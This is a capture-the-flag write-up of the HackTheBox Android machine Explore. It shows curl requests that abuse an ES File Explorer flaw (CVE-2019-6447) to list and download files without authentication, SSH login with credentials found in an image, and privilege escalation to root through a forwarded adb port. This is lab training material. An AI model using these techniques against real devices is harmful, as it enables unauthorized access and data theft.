+++
authors = ["Matt Johnson"]
title = 'HTB: Explore Writeup'
date = '2021-11-01'
description = "Here's how to solve HackTheBox's Explore."
draft = false
tags = ["hackthebox","security"]
summary = "Here's how to solve HackTheBox's Explore."
+++

{{< toc >}}

# High-Level Information

Machine Name: Explore

IP Address: 10.10.10.247

Difficulty: Easy

Summary: HackTheBox's Explore was my first foray into the world of hacking Android devices, and it was, all things considered, a gentle introduction and a good machine for those who aren't familiar with the android system as the internal enumeration needed to find the path to root requires you to learn about a crucial service used to debug Android programs. The box begins with the discovery of a vulnerability that allows unauthenticated remote users to enumerate the local system and download files. That enumeration eventually leads the user to find a file containing credentials that allow the user to SSH into the system. Once on the local system, running the `netstat` command leads to the discovery of Android debugger (adb) running on local port `5555`. By forwarding this port to the remote attacker's machine, only a few commands, all of which are well documented in Android's official documentation for developers, are required to escalate privileges to root.

Tools Used: Nmap, cURL, ssh, adb

# Initial Foothold

As always, I began by performing an Nmap scan:

```markdown
# Nmap 7.91 scan initiated Mon Aug 30 07:29:45 2021 as: nmap -sC -sV -p- -oA nmap 10.10.10.247
Nmap scan report for 10.10.10.247
Host is up (0.051s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
45389/tcp open     unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 30 Aug 2021 11:34:53 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest:
|     HTTP/1.1 412 Precondition Failed
|     Date: Mon, 30 Aug 2021 11:34:53 GMT
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.0 501 Not Implemented
|     Date: Mon, 30 Aug 2021 11:34:58 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help:
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 30 Aug 2021 11:35:13 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest:
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 30 Aug 2021 11:34:58 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 30 Aug 2021 11:35:13 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 30 Aug 2021 11:35:13 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ??random1random2random3random4
|   TerminalServerCookie:
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 30 Aug 2021 11:35:13 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|_    Cookie: mstshash=nmap
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=8/30%Time=612CC148%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port45389-TCP:V=7.91%I=7%D=8/30%Time=612CC147%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x20
SF:30\x20Aug\x202021\x2011:34:53\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Mon,\x2030\x20Aug\x202021\x2011:3
SF:4:53\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Mon,\x2030\x20Aug\x202021\x
SF:2011:34:58\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Mon,\x2030\x20Aug\x202021\x2011:34:58\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Mon,\x2030\x20Aug\x202021\x2011:35:13\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x2030\x20Aug\x
SF:202021\x2011:35:13\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x203
SF:0\x20Aug\x202021\x2011:35:13\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Mon,\x2030\x20Aug\x202021\x2011:35:13\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 30 07:31:50 2021 -- 1 IP address (1 host up) scanned in 124.50 seconds
```

The Nmap scan revealed several open ports, several of which are seemingly designed to lead the user down a rabbit hole. Of all of the things I've learned, perhaps the most important is to always try to exhaust the low-hanging fruit before going down rabbit holes. Given my relative lack of experience testing Android devices, I had relatively little way to gauge the exploitability of each service exposed to external users. Whereas my initial explorations into most services were fruitless, I managed to find an interesting writeup about the ES Explorer service by [KnownSec](https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566). Essentially, a vulnerability in the application identified in 2019 allows remote unauthenticated users to execute a number of commands which allows for system enumeration. None of the commands have any documented code execution mechanisms, but that doesn't mean that valuable information can't be gained just using the available commands and some bash trickery.

```shell
┌──(kali@kali)-[~/htb/explore/enum]
└─$ curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777 | tee listFiles.out
    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                    Dload  Upload   Total   Spent    Left  Speed
100  5029  100  5006  100    23  52694    242 --:--:-- --:--:-- --:-[:--     0
{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", },
{"name":"vndservice_contexts", "time":"9/2/21 07:28:53 AM", "type":"file", "size":"65.00 Bytes (65 Bytes)", },
{"name":"vendor_service_contexts", "time":"9/2/21 07:28:53 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"vendor_seapp_contexts", "time":"9/2/21 07:28:53 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"vendor_property_contexts", "time":"9/2/21 07:28:53 AM", "type":"file", "size":"392.00 Bytes (392 Bytes)", },
{"name":"vendor_hwservice_contexts", "time":"9/2/21 07:28:53 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"vendor_file_contexts", "time":"9/2/21 07:28:53 AM", "type":"file", "size":"6.92 KB (7,081 Bytes)", },
…
┌──(kali@kali)-[~/htb/explore/enum]
└─$ cat listFiles.out | grep '"type":"file"' | awk -F', ' '{print $1}' | awk -F':' '{print $2}' | tr -d '"' > filenames

┌──(kali@kali)-[~/htb/explore/enum]
└─$ cat listFiles.out | grep '"type":"folder"' | awk -F', ' '{print $1}' | awk -F':' '{print $2}' | tr -d '"' > foldernames
```

In this series of commands, I pulled down all files and folders and created separate lists for files and folders. The folders could be further enumerated using similar commands as those identified above and files could be downloaded using the `getFile` function of the ES Explorer software. Using some one-liners I was able to efficiently iterate through the subdirectories within the root directory and managed to find some interesting files in the `/sdcard` directory:

```shell
┌──(kali@kali)-[~/htb/explore/enum]
└─$  cat foldernames | while read p; do echo "\n\n$p\n--"; curl --header "Content-Type: application/json" -s --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777/$p/ | awk -F', ' '{print $1, $3}' | tr -d '{' | tr -d '"'; done | tee nested-ls

…
sdcard
--

name:Android type:folder
name:.estrongs type:folder
name:Download type:folder
name:dianxinos type:folder
name:Notifications type:folder
name:DCIM type:folder
name:Alarms type:folder
name:Podcasts type:folder
name:Pictures type:folder
name:.userReturn type:file
name:user.txt type:file
name:Movies type:folder
name:Music type:folder
name:backups type:folder
name:Ringtones type:folder
]
…

┌──(kali@kali)-[~/htb/explore]
└─$ curl --header "Content-Type: application/json" -s --request POST --data "{\"command\":\"getFile\"}" http://10.10.10.247:59777/sdcard/user.txt
f32017174c…
```

Further focusing my efforts on the `/sdcard` directory, I enumerated its subdirectories:

```shell
┌──(kali@kali)-[~/htb/explore/enum]
└─$ cat sdcard-folders | awk -F' ' '{print $1}' | awk -F ':' '{print $2}' | while read p; do  echo "\n\n$p\n--"; curl --header "Content-Type: application/json" -s --request POST --data "{\"comman
d\":\"listFiles\"}" http://10.10.10.247:59777/sdcard/$p/ | awk -F', ' '{print $1, $3}' | tr -d '{' | tr -d '"'; done | tee sdcard-nested-ls


Android
--

name:data type:folder
]

…

DCIM
--

name:concept.jpg type:file
name:anc.png type:file
name:creds.jpg type:file
name:224_anc.png type:file
]

…
```

Within the `/sdcard/DCIM` directory there's a file called `creds.jpg`, which I promptly downloaded.

![](creds.jpg)

Using those credentials, I was able to ssh onto the device as the `kristi` user.

```shell
┌──(kali@kali)-[~]
└─$ ssh -p 2222 kristi@10.10.10.247
Password authentication
Password:
:/ $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
```

# Privilege Escalation

Once on the box as the `kristi` user, I was in somewhat of unusual territory. Android devices feel familiar given their Linux underpinnings, however, the differences in filesystem design and the platitude of unfamiliar services will definitely act to increase the level of noise and confusion to those familiar with Linux but unfamiliar with Android. The best way to go about approaching it, in my humble opinion, is not to think of all of the differences between the machines, but rather to focus on the similarities and the common techniques utilized on Linux systems to escalate privileges. With that said, I performed basic manual enumeration of the machine using common tools and was reintroduced to the previously filtered port `5555`.

```shell
:/ $ netstat -an
Active Internet connections (established and servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp6       0      0 :::59777                :::*                    LISTEN
tcp6       0      0 ::ffff:10.10.10.2:43457 :::*                    LISTEN
tcp6       0      0 ::ffff:127.0.0.1:33705  :::*                    LISTEN
tcp6       0      0 :::2222                 :::*                    LISTEN
tcp6       0      0 :::5555                 :::*                    LISTEN
tcp6       0      0 :::42135                :::*                    LISTEN
tcp6       0      0 ::ffff:127.0.0.1:60534  ::ffff:127.0.0.1:5555   ESTABLISHED
tcp6       0      0 ::ffff:127.0.0.1:60532  ::ffff:127.0.0.1:5555   ESTABLISHED
tcp6       0      0 ::ffff:127.0.0.1:60538  ::ffff:127.0.0.1:5555   ESTABLISHED
tcp6       0      0 ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:60534  ESTABLISHED
tcp6       0      0 ::ffff:127.0.0.1:60536  ::ffff:127.0.0.1:5555   ESTABLISHED
tcp6       0      0 ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:60536  ESTABLISHED
tcp6       0      0 ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:60538  ESTABLISHED
tcp6       0      0 ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:60532  ESTABLISHED
tcp6       0    656 ::ffff:10.10.10.24:2222 ::ffff:10.10.14.1:34112 ESTABLISHED
udp        0      0 10.10.10.247:14873      1.1.1.1:53              ESTABLISHED
udp        0      0 10.10.10.247:20128      1.0.0.1:53              ESTABLISHED
udp        0      0 0.0.0.0:52088           0.0.0.0:*
udp        0      0 0.0.0.0:5353            0.0.0.0:*
udp6       0      0 :::55597                :::*
udp6       0      0 :::1900                 :::*
udp6       0      0 ::ffff:10.10.10.2:53365 :::*
udp6       0      0 :::5353                 :::*
udp6       0      0 :::5353                 :::*
udp6       0      0 :::5353                 :::*
…
```

Once on the box, enumeration of this port becomes much simpler and it becomes clear through open-source research that this service is likely the Android Debug Bridge (adb). This service is part of the Android software development kit (SDK) and is used primarily by developers to test and debug their projects. The functionalities of the service itself exist to facilitate communication with the device, however, there are some features that, as far as attackers would be concerned, are highly attractive and ripe for exploitation. To exploit this from my host machine, I forwarded the port to my kali box via ssh:

```shell
┌──(kali@kali)-[~/htb/explore]
└─$ ssh kristi@10.10.10.247 -L 5555:127.0.0.1:5555 -p 2222
255 ⨯
Password authentication
Password:
:/ $
:/ $


┌──(kali@kali)-[~/htb/explore]
└─$ netstat -ano | grep 5555
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 ::1:5555                :::*                    LISTEN      off (0.00/0/0)
```

With the port now listening on my local machine, I installed `adb` and began to search for a path to `root` using it. On the [official Android documentation](https://developer.android.com/studio/command-line/adb), they thoroughly describe much of the functionality and the many powerful features associated with the tool. However, there's no clear privilege escalation vector using just what is described there. However, what is not as well documented (on the Android Developer site, anyhow) is that there is built-in functionality for restarting the `adb` daemon as `root`, which would allow any user with access to the debugger to spawn a `root` shell. Worth noting that this will only work if root access for adb is enabled in the developer settings. With that in place, going from `kristi` to `root` requires only a few simple commands. First, I ran the officially documented commands to demonstrate that those alone would not allow one to get a `root` shell:

```shell
┌──(kali@kali)-[~/htb/explore]
└─$ adb connect 127.0.0.1:5555
connected to 127.0.0.1:5555

┌──(kali@kali)-[~/htb/explore]
└─$ adb shell
x86_64:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
x86_64:/ $ exit
```

After that, I restarted the daemon as `root` and ran the same commands again:

```shell
┌──(kali@kali)-[~/htb/explore]
└─$ adb root
restarting adbd as root

┌──(kali@kali)-[~/htb/explore]
└─$ adb shell
x86_64:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:su:s0
x86_64:/sdcard/Android/data # find / -name root.txt 2> /dev/null
/data/root.txt
1|x86_64:/sdcard/Android/data # 
```